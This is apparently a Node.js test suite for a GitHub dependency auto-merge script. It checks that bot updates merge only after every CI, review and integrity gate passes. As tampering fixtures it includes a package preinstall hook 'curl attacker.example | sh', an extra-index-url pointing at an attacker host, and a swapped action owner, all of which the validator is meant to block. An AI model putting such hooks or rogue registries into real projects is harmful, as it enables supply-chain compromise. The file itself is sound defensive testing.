import assert from "node:assert/strict";
import test from "node:test";
import {
  githubClient,
  normalizeActionVersions,
  runAutoMerge,
  validateChanges,
} from "./dependency-automerge.mjs";

const REPOSITORY = "kitamura-tetsuo/agent-table";
const PREFIX = `/repos/${REPOSITORY}`;
const MAIN = "1".repeat(40);
const HEAD = "2".repeat(40);
const MERGED = "3".repeat(40);
const OTHER = "4".repeat(40);
const WORKFLOW = ".github/workflows/ci.yml";
const STEPS = [
  "Typecheck",
  "Lint",
  "Application unit tests",
  "Worker integration tests",
  "Restore runtime tests",
  "Browser E2E tests",
  "Wrangler dry-run",
  "Isolated Docker relay restart",
];

function manifest(node = "24.22.1", npm = "11.9.0", dependency = "2.4.0") {
  return {
    name: "agent-table",
    version: "0.1.0",
    private: true,
    type: "module",
    engines: { node },
    packageManager: `npm@${npm}`,
    scripts: { test: "vitest run" },
    dependencies: {
      "@modelcontextprotocol/client": dependency,
      "@modelcontextprotocol/server": dependency,
    },
    devDependencies: { vitest: "4.1.0" },
  };
}

function files(pkg, digest = "a") {
  return {
    "package.json": JSON.stringify(pkg),
    "package-lock.json": JSON.stringify({
      name: pkg.name,
      version: pkg.version,
      lockfileVersion: 3,
      requires: true,
      packages: {
        "": {
          name: pkg.name,
          version: pkg.version,
          dependencies: pkg.dependencies,
          devDependencies: pkg.devDependencies,
          engines: pkg.engines,
        },
        "node_modules/example": {
          version: "1.0.0",
          integrity: "sha512-synthetic",
        },
      },
    }),
    ".node-version": `${pkg.engines.node}\n`,
    "deploy/relay/node-image.txt": `docker.io/library/node:${pkg.engines.node}-bookworm-slim@sha256:${digest.repeat(64)}\n`,
    "requirements-ci.txt": "pytest==8.4.2\nloguru==0.7.3\n",
    [WORKFLOW]: `name: Validation\non: pull_request\npermissions:\n  contents: read\njobs:\n  verify:\n    steps:\n      - uses: actions/checkout@${"a".repeat(40)} # v4.2.2\n      - run: npm test\n`,
  };
}

function fixture(kind = "dependabot") {
  const base = files(manifest());
  const next =
    kind === "runtime"
      ? files(manifest("24.22.3", "11.19.0"), "b")
      : files(manifest("24.22.1", "11.9.0", "3.0.0"));
  if (kind === "dependabot") {
    next["requirements-ci.txt"] = "pytest==9.1.0\nloguru==0.8.0\n";
    next[WORKFLOW] = base[WORKFLOW]
      .replaceAll("a".repeat(40), "b".repeat(40))
      .replace("# v4.2.2", "# v6.0.0");
  }
  const filenames = Object.keys(base).filter(
    (name) => base[name] !== next[name],
  );
  const branch =
    kind === "runtime"
      ? "automation/runtime-updates"
      : "dependabot/multi-ecosystem-dependencies-abc";
  const state = {
    main: MAIN,
    before: base,
    after: next,
    pr: {
      number: 123,
      state: "open",
      draft: false,
      merged: false,
      mergeable: true,
      mergeable_state: "clean",
      changed_files: filenames.length,
      labels: [],
      user: {
        type: "Bot",
        login: kind === "runtime" ? "github-actions[bot]" : "dependabot[bot]",
        id: kind === "runtime" ? 41898282 : 49699333,
      },
      base: { ref: "main", sha: MAIN, repo: { full_name: REPOSITORY } },
      head: { ref: branch, sha: HEAD, repo: { full_name: REPOSITORY } },
    },
    run: {
      id: 789,
      run_attempt: 1,
      repository: { full_name: REPOSITORY },
      head_repository: { full_name: REPOSITORY },
      path: WORKFLOW,
      event: kind === "runtime" ? "workflow_dispatch" : "pull_request",
      head_branch: branch,
      head_sha: HEAD,
      status: "completed",
      conclusion: "success",
      pull_requests: [
        { number: 123, base: { sha: MAIN }, head: { sha: HEAD } },
      ],
    },
    comparison: {
      status: "ahead",
      behind_by: 0,
      ahead_by: 1,
      merge_base_commit: { sha: MAIN },
    },
    jobs: {
      total_count: 1,
      jobs: [
        {
          name: "verify",
          conclusion: "success",
          steps: STEPS.map((name) => ({ name, conclusion: "success" })),
        },
      ],
    },
    checks: {
      total_count: 1,
      check_runs: [
        { name: "verify", status: "completed", conclusion: "success" },
      ],
    },
    status: { total_count: 0, statuses: [] },
    reviews: [],
    threads: {
      data: {
        repository: {
          pullRequest: {
            reviewThreads: { pageInfo: { hasNextPage: false }, nodes: [] },
          },
        },
      },
    },
    changed: filenames.map((filename) => ({ filename, status: "modified" })),
    merge: { merged: true, sha: MERGED },
  };
  state.runs = { workflow_runs: [state.run] };
  state.mainRuns = { workflow_runs: [] };
  state.associated = [structuredClone(state.pr)];
  const event = {
    repository: { full_name: REPOSITORY },
    workflow_run: structuredClone(state.run),
  };
  const calls = [];
  let prReads = 0;
  const api = async (path, options = {}) => {
    calls.push({ path, ...options });
    let result;
    if (path === `${PREFIX}/actions/runs/789`) result = state.run;
    else if (path === `${PREFIX}/pulls/123`) {
      prReads++;
      result = prReads > 1 && state.freshPr ? state.freshPr : state.pr;
    } else if (path === `${PREFIX}/git/ref/heads/main`)
      result = {
        object: {
          sha: prReads > 1 && state.freshMain ? state.freshMain : state.main,
        },
      };
    else if (path.includes("/compare/"))
      result = state.pr.merged
        ? { status: "identical", merge_base_commit: { sha: MERGED } }
        : state.comparison;
    else if (path.includes("/jobs?")) result = state.jobs;
    else if (path.includes("/actions/workflows/ci.yml/runs?"))
      result = path.includes("branch=main&") ? state.mainRuns : state.runs;
    else if (path.includes("/check-runs?")) result = state.checks;
    else if (path.includes("/status?")) result = state.status;
    else if (path.includes("/reviews?")) result = state.reviews;
    else if (path === "/graphql") result = state.threads;
    else if (path.includes("/files?")) result = state.changed;
    else if (path.includes("/contents/")) {
      const url = new URL(`https://api.github.com${path}`);
      const name = decodeURIComponent(
        url.pathname.slice(`${PREFIX}/contents/`.length),
      );
      const contents =
        url.searchParams.get("ref") === MAIN ? state.before : state.after;
      assert.ok(
        Object.hasOwn(contents, name),
        `Unexpected content request ${name}`,
      );
      const content = contents[name];
      result = {
        type: "file",
        encoding: "base64",
        size: Buffer.byteLength(content),
        content: Buffer.from(content).toString("base64"),
      };
    } else if (path === `${PREFIX}/pulls/123/merge`) {
      result = state.merge;
      if (state.merge.merged) {
        state.pr.merged = true;
        state.pr.state = "closed";
        state.pr.merge_commit_sha = MERGED;
        state.main = MERGED;
      }
    } else if (path === `${PREFIX}/actions/workflows/ci.yml/dispatches`)
      result = null;
    else if (path === `${PREFIX}/commits/${HEAD}/pulls?per_page=100`)
      result = state.associated;
    else throw new Error(`Unexpected API request: ${path}`);
    return structuredClone(result);
  };
  return {
    state,
    event,
    calls,
    invoke: () => runAutoMerge({ event, repository: REPOSITORY, api }),
  };
}

function writes(calls) {
  return calls.filter((call) => call.method && call.path !== "/graphql");
}

async function blocked(change, reason, kind) {
  const f = fixture(kind);
  change(f);
  await assert.rejects(f.invoke, reason);
  assert.deepEqual(writes(f.calls), []);
}

test("one grouped update merges npm majors, Python and action pins only after all gates", async () => {
  const f = fixture();
  const result = await f.invoke();
  assert.equal(result.status, "merged");
  assert.deepEqual(writes(f.calls), [
    {
      path: `${PREFIX}/pulls/123/merge`,
      method: "PUT",
      body: { sha: HEAD, merge_method: "squash" },
    },
    {
      path: `${PREFIX}/actions/workflows/ci.yml/dispatches`,
      method: "POST",
      body: { ref: "main" },
    },
  ]);
});

test("runtime bot validates matching Node, npm, Docker and lockfile pins", async () => {
  const f = fixture("runtime");
  assert.equal((await f.invoke()).status, "merged");
});

test("failed CI produces no API calls", async () => {
  const f = fixture();
  f.event.workflow_run.conclusion = "failure";
  assert.equal((await f.invoke()).status, "skipped");
  assert.deepEqual(f.calls, []);
});

test("bot names alone do not grant merge authority", async () => {
  for (const change of [
    (pr) => {
      pr.user.id = 123;
    },
    (pr) => {
      pr.user.type = "User";
    },
    (pr) => {
      pr.head.ref = "user/update";
    },
  ]) {
    const f = fixture();
    change(f.state.pr);
    assert.equal((await f.invoke()).reason, "not-authorized-update-bot");
    assert.deepEqual(writes(f.calls), []);
  }
});

test("an explicit manual-review label stops a valid dependency update", async () => {
  const f = fixture();
  f.state.pr.labels.push({ name: "manual-review" });
  assert.equal((await f.invoke()).reason, "manual-review-requested");
  assert.deepEqual(writes(f.calls), []);
});

test("head changes after successful CI are refused", () =>
  blocked(({ state }) => {
    state.pr.head.sha = OTHER;
  }, /tested-sha/));
test("fork PRs cannot inherit a bot identity", () =>
  blocked(({ state }) => {
    state.pr.head.repo.full_name = "attacker/agent-table";
  }, /tested-sha/));
test("an obsolete successful attempt is refused", () =>
  blocked(({ state }) => {
    state.run.run_attempt = 2;
  }, /validation-run-mismatch/));
test("a newer pending Validation blocks the earlier successful run", () =>
  blocked(({ state }) => {
    state.runs.workflow_runs.push({
      ...state.run,
      id: 790,
      conclusion: null,
      status: "queued",
    });
  }, /superseded/));
test("stale tested base is refused", () =>
  blocked(({ state }) => {
    state.run.pull_requests[0].base.sha = OTHER;
  }, /tested-base-changed/));
test("candidate branches must include the current main", () =>
  blocked(({ state }) => {
    state.comparison.status = "diverged";
    state.comparison.behind_by = 1;
  }, /needs-rebase/));
test("skipping the Docker restart test blocks merge", () =>
  blocked(({ state }) => {
    state.jobs.jobs[0].steps.at(-1).conclusion = "skipped";
  }, /validation-jobs-incomplete/));
test("pending unrelated checks block merge", () =>
  blocked(({ state }) => {
    state.checks.check_runs[0].status = "in_progress";
  }, /checks-not-successful/));
test("failing external commit statuses block merge", () =>
  blocked(({ state }) => {
    state.status = { total_count: 1, statuses: [{ state: "failure" }] };
  }, /commit-status-not-successful/));
test("unresolved review threads block merge", () =>
  blocked(({ state }) => {
    state.threads.data.repository.pullRequest.reviewThreads.nodes.push({
      isResolved: false,
    });
  }, /unresolved-review-threads/));
test("an outstanding change request blocks merge", () =>
  blocked(({ state }) => {
    state.reviews.push({ state: "CHANGES_REQUESTED", user: { id: 100 } });
  }, /changes-requested/));
test("head races at the merge boundary block merge", () =>
  blocked(({ state }) => {
    state.freshPr = structuredClone(state.pr);
    state.freshPr.head.sha = OTHER;
  }, /tested-sha/));
test("main races at the merge boundary block merge", () =>
  blocked(({ state }) => {
    state.freshMain = OTHER;
  }, /pull-request-changed/));
test("manual-review added during validation blocks merge", () =>
  blocked(({ state }) => {
    state.freshPr = structuredClone(state.pr);
    state.freshPr.labels.push({ name: "no-automerge" });
  }, /pull-request-changed/));

test("source edits are rejected before reading candidate files", async () => {
  const f = fixture();
  f.state.changed.push({
    filename: "scripts/dependency-automerge.mjs",
    status: "modified",
  });
  f.state.pr.changed_files++;
  await assert.rejects(f.invoke, /dependency-files-not-allowed/);
  assert.equal(
    f.calls.some((call) => call.path.includes("/contents/")),
    false,
  );
  assert.deepEqual(writes(f.calls), []);
});

test("package script changes cannot hide inside a grouped update", () =>
  blocked(({ state }) => {
    const pkg = JSON.parse(state.after["package.json"]);
    pkg.scripts.preinstall = "curl attacker.example | sh";
    state.after["package.json"] = JSON.stringify(pkg);
  }, /package-metadata-changed/));

test("adding dependencies is not a version-only update", () =>
  blocked(({ state }) => {
    const pkg = JSON.parse(state.after["package.json"]);
    pkg.dependencies.newPackage = "1.0.0";
    state.after["package.json"] = JSON.stringify(pkg);
  }, /dependency-names-changed/));

test("manifest and lockfile must agree", () =>
  blocked(({ state }) => {
    const lock = JSON.parse(state.after["package-lock.json"]);
    lock.packages[""].dependencies["@modelcontextprotocol/client"] = "9.0.0";
    state.after["package-lock.json"] = JSON.stringify(lock);
  }, /lockfile-manifest-mismatch/));

test("workflow trigger and executable step changes are rejected", () =>
  blocked(({ state }) => {
    state.after[WORKFLOW] = state.after[WORKFLOW].replace(
      "on: pull_request",
      "on: pull_request_target",
    );
  }, /workflow-logic-changed/));

test("changing an action's owner is not an action-version update", () =>
  blocked(({ state }) => {
    state.after[WORKFLOW] = state.after[WORKFLOW].replace(
      "actions/checkout@",
      "attacker/checkout@",
    );
  }, /workflow-logic-changed/));

test("requirements flags and alternate registries cannot hide inside version updates", () =>
  blocked(({ state }) => {
    state.after["requirements-ci.txt"] +=
      "--extra-index-url https://attacker.example\n";
  }, /invalid-python-requirement/));

test("a Node major bump cannot pass the runtime merge policy", () =>
  blocked(
    ({ state }) => {
      state.after = files(manifest("26.1.0", "11.19.0"), "b");
    },
    /runtime-major/,
    "runtime",
  ));

test("a mismatched Docker tag cannot pass the runtime merge policy", () =>
  blocked(
    ({ state }) => {
      state.after["deploy/relay/node-image.txt"] = state.after[
        "deploy/relay/node-image.txt"
      ].replace("24.22.3", "24.22.1");
    },
    /node-image-pin-mismatch/,
    "runtime",
  ));

test("runtime updates cannot change locked dependencies", () =>
  blocked(
    ({ state }) => {
      const lock = JSON.parse(state.after["package-lock.json"]);
      lock.packages["node_modules/example"].version = "2.0.0";
      state.after["package-lock.json"] = JSON.stringify(lock);
    },
    /runtime-lock-fields-changed/,
    "runtime",
  ));

test("digest-only updates remain eligible", () => {
  const before = files(manifest());
  const after = files(manifest(), "b");
  validateChanges("runtime", ["deploy/relay/node-image.txt"], before, after);
});

test("action normalization preserves every executable YAML byte", () => {
  const before =
    '      - uses: "actions/setup-node@v4" # v4\n        with:\n          node-version: 24\n';
  const after = before.replaceAll("v4", "v6");
  assert.equal(normalizeActionVersions(before), normalizeActionVersions(after));
  assert.notEqual(
    normalizeActionVersions(before),
    normalizeActionVersions(
      after.replace("node-version: 24", "node-version: 26"),
    ),
  );
});

test("an unconfirmed merge never dispatches a release gate", async () => {
  const f = fixture();
  f.state.merge = { merged: false, message: "blocked" };
  await assert.rejects(f.invoke, /merge-not-confirmed/);
  assert.equal(writes(f.calls).length, 1);
});

test("API client keeps credentials on the fixed GitHub origin and rejects redirects", async () => {
  const requests = [];
  const api = githubClient("test-token", async (url, options) => {
    requests.push({ url, options });
    return { ok: true, status: 204 };
  });
  await api(`${PREFIX}/actions/workflows/ci.yml/dispatches`, {
    method: "POST",
    body: { ref: "main" },
  });
  assert.equal(
    requests[0].url,
    `https://api.github.com${PREFIX}/actions/workflows/ci.yml/dispatches`,
  );
  assert.equal(requests[0].options.redirect, "error");
  await assert.rejects(
    () => api("https://attacker.example"),
    /api-path-not-allowed/,
  );
  assert.equal(requests.length, 1);
});

test("a missing workflow_run PR association falls back to exact-head API evidence", async () => {
  const f = fixture();
  f.state.run.pull_requests = [];
  assert.equal((await f.invoke()).status, "merged");
});

test("a runtime dispatch can complete while its duplicate PR run awaits approval", async () => {
  const f = fixture("runtime");
  f.state.runs.workflow_runs.push({
    ...f.state.run,
    id: 790,
    event: "pull_request",
    status: "waiting",
    conclusion: null,
    check_suite_id: 999,
  });
  f.state.checks.total_count++;
  f.state.checks.check_runs.push({
    name: "verify",
    app: { slug: "github-actions" },
    status: "pending",
    conclusion: null,
    check_suite: { id: 999 },
  });
  assert.equal((await f.invoke()).status, "merged");
});

test("the approval exception cannot hide another workflow's pending checks", () =>
  blocked(
    ({ state }) => {
      state.runs.workflow_runs.push({
        ...state.run,
        id: 790,
        event: "pull_request",
        status: "waiting",
        conclusion: null,
        check_suite_id: 999,
      });
      state.checks.total_count++;
      state.checks.check_runs.push({
        name: "verify",
        app: { slug: "github-actions" },
        status: "pending",
        conclusion: null,
        check_suite: { id: 1000 },
      });
    },
    /checks-not-successful/,
    "runtime",
  ));

test("a failed duplicate PR check is not an approval exception", () =>
  blocked(
    ({ state }) => {
      state.runs.workflow_runs.push({
        ...state.run,
        id: 790,
        event: "pull_request",
        status: "waiting",
        conclusion: null,
        check_suite_id: 999,
      });
      state.checks.total_count++;
      state.checks.check_runs.push({
        name: "verify",
        app: { slug: "github-actions" },
        status: "completed",
        conclusion: "failure",
        check_suite: { id: 999 },
      });
    },
    /checks-not-successful/,
    "runtime",
  ));

test("replaying an already merged update recovers a missing main dispatch without merging twice", async () => {
  const f = fixture();
  await f.invoke();
  const firstCallCount = f.calls.length;
  const result = await f.invoke();
  assert.equal(result.status, "already-merged");
  assert.deepEqual(writes(f.calls.slice(firstCallCount)), [
    {
      path: `${PREFIX}/actions/workflows/ci.yml/dispatches`,
      method: "POST",
      body: { ref: "main" },
    },
  ]);
});

test("replaying a merged update does not duplicate an existing main validation", async () => {
  const f = fixture();
  await f.invoke();
  f.state.mainRuns.workflow_runs.push({
    ...f.state.run,
    head_sha: MERGED,
    head_branch: "main",
    event: "workflow_dispatch",
    status: "queued",
    conclusion: null,
  });
  const firstCallCount = f.calls.length;
  const result = await f.invoke();
  assert.equal(result.status, "already-merged");
  assert.equal(result.mainValidationDispatched, false);
  assert.deepEqual(writes(f.calls.slice(firstCallCount)), []);
});

test("dependency updates cannot replace stable versions with a prerelease", () =>
  blocked(({ state }) => {
    const pkg = JSON.parse(state.after["package.json"]);
    pkg.dependencies["@modelcontextprotocol/client"] = "9.0.0-beta.1";
    state.after["package.json"] = JSON.stringify(pkg);
  }, /stable-to-prerelease-update/));
